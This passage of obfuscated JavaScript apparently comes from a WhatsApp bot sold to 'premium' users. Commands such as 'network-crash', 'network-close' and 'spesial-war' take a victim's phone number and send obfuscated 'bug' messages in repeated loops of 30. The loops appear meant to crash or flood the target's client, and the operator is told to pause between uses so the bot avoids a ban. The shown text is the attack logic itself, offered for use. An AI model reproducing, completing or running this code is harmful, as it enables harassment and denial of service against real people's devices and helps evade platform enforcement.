            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4de787(_0x173a47, _0x600e6e);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4de787(_0x173a47, _0x600e6e);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4de787(_0x173a47, _0x600e6e);
            await _0x4b4561(_0x173a47, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x5622fd + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "spesial-war":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3ffda4 = q.replace(/[^0-9]/g, '');
          if (_0x3ffda4.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0xca1ac6 = _0x3ffda4 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x376d29 = 0x0; _0x376d29 < 0x1e; _0x376d29++) {
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x28a511(_0xca1ac6);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x28a511(_0xca1ac6);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x28a511(_0xca1ac6);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x28a511(_0xca1ac6);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x28a511(_0xca1ac6);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x28a511(_0xca1ac6);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x28a511(_0xca1ac6);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4de787(_0xca1ac6, _0x600e6e);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4de787(_0xca1ac6, _0x600e6e);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
            await _0x156efb(_0xca1ac6, _0x3facec);
            await _0x4de787(_0xca1ac6, _0x600e6e);
            await _0x4b4561(_0xca1ac6, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x3ffda4 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-close":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0xe5970f = q.replace(/[^0-9]/g, '');
          if (_0xe5970f.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x221a2a = _0xe5970f + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x2114ef = 0x0; _0x2114ef < 0x1e; _0x2114ef++) {
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x28a511(_0x221a2a);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x28a511(_0x221a2a);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x28a511(_0x221a2a);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4de787(_0x221a2a, _0x600e6e);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4de787(_0x221a2a, _0x600e6e);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4b4561(_0x221a2a, _0x600e6e);
            await _0x156efb(_0x221a2a, _0x3facec);
            await _0x4de787(_0x221a2a, _0x600e6e);
            await _0x4b4561(_0x221a2a, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0xe5970f + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-crash":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x52fe83 = q.replace(/[^0-9]/g, '');
          if (_0x52fe83.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x23102b = _0x52fe83 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x5512b5 = 0x0; _0x5512b5 < 0x1e; _0x5512b5++) {
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x28a511(_0x23102b);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x28a511(_0x23102b);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x28a511(_0x23102b);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4de787(_0x23102b, _0x600e6e);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4de787(_0x23102b, _0x600e6e);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4b4561(_0x23102b, _0x600e6e);
            await _0x156efb(_0x23102b, _0x3facec);
            await _0x4de787(_0x23102b, _0x600e6e);
            await _0x4b4561(_0x23102b, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x52fe83 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case 'network-one':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4553e0 = q.replace(/[^0-9]/g, '');
          if (_0x4553e0.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3634ef = _0x4553e0 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x6789f3 = 0x0; _0x6789f3 < 0x1e; _0x6789f3++) {
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x28a511(_0x3634ef);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x28a511(_0x3634ef);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x28a511(_0x3634ef);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4de787(_0x3634ef, _0x600e6e);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4de787(_0x3634ef, _0x600e6e);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4b4561(_0x3634ef, _0x600e6e);
            await _0x156efb(_0x3634ef, _0x3facec);
            await _0x4de787(_0x3634ef, _0x600e6e);
            await _0x4b4561(_0x3634ef, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x4553e0 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-xl":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x582198 = q.replace(/[^0-9]/g, '');
          if (_0x582198.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x471b3c = _0x582198 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x34a02c = 0x0; _0x34a02c < 0x1e; _0x34a02c++) {
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x28a511(_0x471b3c);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x28a511(_0x471b3c);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x28a511(_0x471b3c);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4de787(_0x471b3c, _0x600e6e);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4de787(_0x471b3c, _0x600e6e);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
            await _0x4b4561(_0x471b3c, _0x600e6e);
            await _0x156efb(_0x471b3c, _0x3facec);
